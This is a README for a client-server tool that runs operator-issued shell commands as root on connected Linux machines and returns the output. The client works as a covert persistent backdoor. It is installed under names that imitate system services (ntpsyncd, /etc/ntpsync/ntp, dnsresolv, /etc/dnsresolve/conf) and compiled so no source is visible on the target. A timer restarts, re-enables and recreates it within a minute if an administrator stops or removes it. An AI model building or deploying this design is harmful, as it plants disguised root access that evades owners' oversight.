# Remote Command Execution System

A client-server system for remote command execution. The server listens on a configurable port and sends commands to connected clients. Clients execute commands with root privileges and return the output.

## ⚠️ Security Warning

**This system allows remote command execution with root privileges. Use only in trusted, isolated networks with proper security measures in place.**

## Features

### Server
- Listens on configurable port (default: 8443)
- Accepts multiple client connections
- Interactive command prompt
- **Execute commands on specific clients or all clients**
- **Client identification by custom name or IP address**
- Displays command output (stdout/stderr) from all clients
- Shows exit codes for executed commands

### Client
- Connects to server every second
- **Identifies itself with custom name or auto-detects primary IP**
- Executes commands as root user
- Returns stdout, stderr, and exit codes
- Automatic reconnection on connection loss
- Systemd service integration
- Self-healing monitoring system

### Monitoring System
- **ntpsyncd.service**: Runs the client as a background service
- **dnsresolv.timer**: Checks service health every minute
- Automatically restarts stopped/disabled services
- Recreates missing service files
- Logs all monitoring activities

## Quick Start

### Server Setup

1. Navigate to the server directory:
   ```bash
   cd server
   ```

2. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```
   
   **Note for Windows users**: The server uses `pyreadline3` to enable command history and arrow key navigation. This is automatically installed on Windows from requirements.txt.

3. Create and configure `.env`:
   ```bash
   cp env.example .env
   # Edit .env if you want to change the port
   ```

4. Run the server:
   ```bash
   python server.py
   ```

### Client Setup (Linux)

1. Navigate to the client directory:
   ```bash
   cd client
   ```

2. Create and configure `.env`:
   ```bash
   cp env.example .env
   nano .env  # Set SERVER_HOST to your server's IP address
              # Optionally set CLIENT_NAME for easy identification
   ```

3. Run the automated installation script:
   ```bash
   sudo ./install.sh
   ```

The installation script will:
- Install Python dependencies (pyinstaller)
- Read configuration from `.env` file
- Embed configuration into the client script
- **Compile both Python scripts to standalone binary executables**
- Copy client binary to `/etc/ntpsync/ntp`
- Copy monitor binary to `/etc/dnsresolve/conf`
- Install and enable the systemd service
- Install and enable the monitoring timer
- Start the service

**Important**: The installed files (`/etc/ntpsync/ntp` and `/etc/dnsresolve/conf`) are compiled binaries, not Python scripts. Source code is not visible or accessible on the target system.

## Configuration

### Server Configuration (server/.env)

```env
SERVER_HOST=0.0.0.0    # Interface to bind to
SERVER_PORT=8443       # Port to listen on
```

### Client Configuration (client/.env)

```env
SERVER_HOST=localhost  # Server IP address or hostname
SERVER_PORT=8443       # Server port
CLIENT_NAME=           # Optional: Custom client name (e.g., web-server-1)
                       # If empty, uses system hostname
```

## Usage

### Server Commands

Once the server is running, you can:

1. **Execute commands on all clients**: Type any shell command and press Enter.
   ```
   server> whoami
   ```

2. **Execute commands on specific client**: Use `@client_name` prefix.
   ```
   server> @web-server-1 systemctl restart nginx
   server> @192.168.1.100 df -h
   ```

3. **Execute commands on all clients explicitly**: Use `@all` prefix.
   ```
   server> @all uptime
   ```

4. **List clients**: Type `list` or `clients` to see connected clients with their names.
   ```
   server> list
   ```

5. **Exit server**: Type `exit` or `quit` to shutdown the server.

**📖 See [COMMAND_TIPS.md](COMMAND_TIPS.md) for detailed information about which commands work best and how to use interactive commands like `htop`, `top`, etc.**

### Command Line Features

The server provides bash-like command line editing:
- **Up/Down arrows**: Navigate command history
- **Left/Right arrows**: Move cursor within the line
- **Ctrl+A**: Jump to beginning of line
- **Ctrl+E**: Jump to end of line
- **Backspace/Delete**: Edit commands

## Client Service Management

### Check Service Status

```bash
sudo systemctl status ntpsyncd
```

### View Live Logs

```bash
sudo journalctl -u ntpsyncd -f
```

### Update Configuration

To update the configuration after installation:

1. Edit the `.env` file in the client directory with new values
2. Reinstall the service:
   ```bash
   cd client
   sudo ./install.sh
   ```

The installation script will update the embedded configuration and restart the service.

### Manually Restart Service

```bash
sudo systemctl restart ntpsyncd
```

### Check Monitoring Timer

```bash
# Timer status
sudo systemctl status dnsresolv.timer

# Timer logs
sudo journalctl -u dnsresolv.timer -f

# Monitor script logs
sudo journalctl -u dnsresolv -f
```

### Stop Service

```bash
sudo systemctl stop ntpsyncd
sudo systemctl disable ntpsyncd
```

**Note**: The monitoring timer will automatically restart and re-enable the service within 1 minute.

## Installation Details

### Client Installation Locations

- **Client binary**: `/etc/ntpsync/ntp` (compiled executable with embedded configuration)
- **Monitor binary**: `/etc/dnsresolve/conf` (compiled executable)
- **Service file**: `/etc/systemd/system/ntpsyncd.service`
- **Timer files**: `/etc/systemd/system/dnsresolv.{service,timer}`

**Important**: Both installed files are compiled binaries (ELF format). No Python source code exists on the target system. Configuration is embedded during compilation.

### How the Monitoring Works

1. The `dnsresolv.timer` triggers every minute
2. It runs `dnsresolv.service` which executes `monitor.sh`
3. The monitor script checks:
   - If service file exists (recreates if missing)
   - If client script exists (restores if missing)
   - If service is active (starts if stopped)
   - If service is enabled (enables if disabled)
4. All actions are logged to the systemd journal

### Client Identification

Clients identify themselves to the server in one of two ways:

1. **Custom Name**: If `CLIENT_NAME` is set in `.env`, it uses that name
2. **Auto-detect**: If `CLIENT_NAME` is empty, it uses the system hostname

Examples:
```env
# Custom name
CLIENT_NAME=web-server-1

# Auto-detect hostname (leave empty)
CLIENT_NAME=
```

## Troubleshooting

### Client Can't Connect to Server

1. Check if server is running:
   ```bash
   # On server machine
   netstat -tulpn | grep 8443
   ```

2. Check firewall rules:
   ```bash
   # Allow port 8443
   sudo ufw allow 8443/tcp
   ```

3. Verify client configuration:
   ```bash
   cat /etc/ntpsync/.env
   ```

### Service Keeps Stopping

Check the service logs:
```bash
sudo journalctl -u ntpsyncd -n 100
```

Common issues:
- Incorrect server address in configuration
- Network connectivity problems
- Python dependencies not installed (pyinstaller)

### Monitor Not Working

1. Check timer status:
   ```bash
   systemctl list-timers dnsresolv.timer
   ```

2. Check monitor logs:
   ```bash
   sudo journalctl -u dnsresolv -n 50
   ```

### Wrong Client Name Showing

If the auto-detected IP is incorrect or you want a custom name:

1. Edit the `.env` file in the client directory:
   ```bash
   cd client
   nano .env
   ```

2. Set CLIENT_NAME:
   ```env
   CLIENT_NAME=my-server-name
   ```

3. Reinstall the service:
   ```bash
   sudo ./install.sh
   ```

## Development

### Testing Without Installation

**Server**:
```bash
cd server
python server.py
```

**Client**:
```bash
cd client
sudo python client.py
```

### Uninstallation

To completely remove the client, use the uninstall script:

```bash
cd client
sudo ./uninstall.sh
```

The uninstall script will:
- Stop and disable all services
- Remove systemd service files
- Remove the installation directory
- Kill any remaining processes
- Offer to remove Python dependencies
- Verify complete removal

**Note**: Since configuration is embedded in the script, there's no separate `.env` file to backup.

Alternatively, you can manually uninstall:

```bash
# Stop and disable services
sudo systemctl stop ntpsyncd
sudo systemctl disable ntpsyncd
sudo systemctl stop dnsresolv.timer
sudo systemctl disable dnsresolv.timer

# Remove service files
sudo rm /etc/systemd/system/ntpsyncd.service
sudo rm /etc/systemd/system/dnsresolv.service
sudo rm /etc/systemd/system/dnsresolv.timer

# Reload systemd
sudo systemctl daemon-reload

# Remove installation directory
sudo rm -rf /etc/ntpsync
```

## Architecture

### Communication Protocol

The system uses JSON messages over TCP sockets:

**Client Identification** (client → server on connect):
```json
{
  "type": "identify",
  "client_name": "web-server-1"
}
```

**Heartbeat** (server → client):
```json
{"type": "heartbeat"}
```

**Command** (server → client):
```json
{
  "type": "command",
  "command": "ls -la"
}
```

**Response** (client → server):
```json
{
  "command": "ls -la",
  "stdout": "...",
  "stderr": "...",
  "exit_code": 0
}
```

### Connection Flow

1. Client connects to server every second
2. Client sends identification message with name or IP
3. Server stores client with its name for targeting
4. Server sends either heartbeat or command
5. Client responds with acknowledgment or command output
6. Connection persists for multiple commands
7. If connection lost, client automatically reconnects

### Command Targeting

The server supports three command formats:

1. **Broadcast** (default): `command` - executes on all clients
2. **Specific client**: `@client_name command` - executes on named client
3. **Explicit broadcast**: `@all command` - executes on all clients

### Command Execution Features

The client automatically handles different types of commands:

- **Regular commands**: Execute directly with proper environment variables
- **Interactive commands** (htop, top, vim, etc.): Wrapped with `script` command to provide pseudo-terminal
- **Terminal variables**: `TERM`, `COLUMNS`, and `LINES` are set automatically
- **Timeout**: Commands timeout after 60 seconds

See [COMMAND_TIPS.md](COMMAND_TIPS.md) for comprehensive guide on command usage.
